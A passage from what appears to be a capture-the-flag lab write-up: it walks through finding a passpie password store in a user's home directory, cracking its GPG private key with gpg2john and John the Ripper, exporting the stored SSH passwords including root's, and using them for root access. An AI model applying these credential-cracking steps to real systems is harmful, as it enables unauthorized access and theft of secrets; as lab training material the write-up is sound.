Land in jnelsons home directory and find a hidden directory ```.passpie```
- passpie is a command line password manager
```bash
$ passpie
╒════════╤═════════╤════════════╤═══════════╕
│ Name   │ Login   │ Password   │ Comment   │
╞════════╪═════════╪════════════╪═══════════╡
│ ssh    │ jnelson │ ********   │           │
├────────┼─────────┼────────────┼───────────┤
│ ssh    │ root    │ ********   │           │
╘════════╧═════════╧════════════╧═══════════╛
```
Trying to export the passwords results in a prompt for a passphrase which is different from the user password that was used for the SSH session.
Checking out that hidden ```.passpie``` directory shows an interesting file ```.keys```
Look at that file to find a GPG public/private key pair -> Try and crack the private key
```bash
# use gpg2john to create a hash that can be cracked
$ gpg2john priv_key > hash
$ cat hash
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::priv_key

# now try and crack this hash using John The Ripper
$ john hash  --show       
Passpie:blink182:::Passpie (Auto-generated by Passpie) <passpie@local>::priv_key
```
The key cracks to ```blink182```!
Use this as the passphrase for passpie and export the passwords
```bash
$ passpie export passwords.db 
$ cat passwords.db 
credentials:
- comment: ''
  fullname: root@ssh
  login: root
  modified: 2022-06-26 08:58:15.621572
  name: ssh
  password: !!python/unicode 'p7qfAZt4_A1xo_0x'
- comment: ''
  fullname: jnelson@ssh
  login: jnelson
  modified: 2022-06-26 08:58:15.514422
  name: ssh
  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
handler: passpie
version: 1.0
```
2 passwords: jnelsons has been compromised already but the root one is new -> use it for a root SSH shell